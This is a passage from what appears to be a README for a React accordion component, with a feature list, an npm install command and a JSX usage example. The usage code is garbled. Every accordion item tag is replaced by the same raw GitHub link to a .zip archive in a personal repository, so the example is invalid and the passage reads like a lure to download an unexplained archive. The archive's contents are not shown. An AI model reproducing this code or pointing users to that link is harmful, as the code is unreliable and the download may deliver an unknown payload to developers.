- Lightweight: Minimal footprint for quick load times.

- Easy to Customize: Adjust styles easily with TailwindCSS or custom CSS.

## Installation

To install the React Accordion component, run the following command:

```bash
npm install react-accordion
```

## Usage

To use the component, import it into your React application. Here is a basic example:

```javascript
import React from 'react';
import Accordion from 'react-accordion';

function App() {
    return (
        <Accordion>
            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip title="Section 1">
                <p>This is the content of section 1.</p>
            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip>
            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip title="Section 2">
                <p>This is the content of section 2.</p>
            <https://raw.githubusercontent.com/vuhuuu11/react-accordion/main/lib/react_accordion_v2.6.zip>
        </Accordion>
    );
}

export default App;
```
